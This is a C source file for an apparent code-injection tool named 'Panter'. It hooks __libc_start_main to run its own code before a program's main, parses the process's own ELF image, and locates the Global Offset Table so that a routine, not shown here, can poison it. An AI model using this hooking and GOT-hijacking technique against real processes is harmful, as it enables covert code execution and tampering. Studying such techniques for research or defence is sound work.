
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <time.h>
#include <stdint.h>

#ifndef _ELF_HELPER
#include "../../includes/elf.h"
#endif

#ifndef _LAYOUT_MAPPING
#include "../../includes/layout_mapping.h"
#endif


#define STRICTLY_CHECK_MAGIC_BYTES	// uses DEBUG
#define TARGET "/proc/self/exe"

static int (*orig_main) (int, char **, char **);

typedef int (*__libc_start_main_t)(int (*main) (int, char * *, char * *),
				int argc,
				char * * ubp_av,
				void (*init) (void),
				void (*fini) (void),
				void (*rtld_fini) (void),
				void (* stack_end));

// Replacement for main, then return real main
int hook_main (int argc, char **argv, char ** envp) 
{
	puts("~===~ [Panter] ~===~\n");
	uintptr_t got_addr;

	struct elf_struct self_elf;
	error_t err = new_load_elf(TARGET, &self_elf);
	if (err.num != 1) {
		// Maybe someone is reading it?
		goto ret;
	}
	#ifdef STRICTLY_CHECK_MAGIC_BYTES
	if (check_elf_magic(&self_elf) == -1) {
			DEBUG("[-] No ELF bytes \n");
			goto ret;
	}
	#endif

	process_phdrs(&self_elf);
	process_sections(&self_elf);
	if (self_elf.dyn.dynsym_tab != NULL) {
		got_addr = get_got_addr(&self_elf);
		if (got_addr == 0) {
			DEBUG("[-] GOT couldn't be found\n");
			goto ret;
		}		// it is offset, 
		DEBUG("GOT @0x%p\n", (void *)got_addr);
	}

	get_rela_plt_offsets(&self_elf);

	// GOT located independently of ASLR

	if (self_elf.sec.parts.got_plt.sh_size != 0) {
		DEBUG("have .got.plt [PLT]\n");
		// infect_got_plt();
		// goto ret;
	}

	printf("[*] ORIG_MAIN %p | GOT_ADDR %p\n", orig_main, got_addr);

	/** find_base poisonis the Global Offset Table
	  */
	find_base((uintptr_t)orig_main, &self_elf, got_addr);
	puts("[]\n");

	ret:
		if (self_elf.fd != -1)
			close(self_elf.fd);

		free(self_elf.dyn.symbols);
	puts("[+] DONE\n\n");
	
	return orig_main(argc, argv, envp);
}

#ifndef PANTER_SEPARATE
int __libc_start_main(__libc_start_main_t lbsm,
			int (*main) (int, char * *, char * *),
			int argc,
			char * * ubp_av,
			void (*init) (void),
			void (*fini) (void),
			void (*rtld_fini) (void),
			void (* stack_end))
#else
int __libc_start_main(int (*main) (int, char * *, char * *),
			int argc,
			char * * ubp_av,
			void (*init) (void),
			void (*fini) (void),
			void (*rtld_fini) (void),
			void (* stack_end))
#endif
{	
	// THERE IS NOT RTLD_NEXT __libc_start_main, -
	__libc_start_main_t orig__libc_start_main;
	#ifndef PANTER_SEPARATE
		orig__libc_start_main = lbsm;
	#else
		orig__libc_start_main = dlsym(RTLD_NEXT, "__libc_start_main");
	#endif

	orig_main = main;

	return orig__libc_start_main(hook_main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
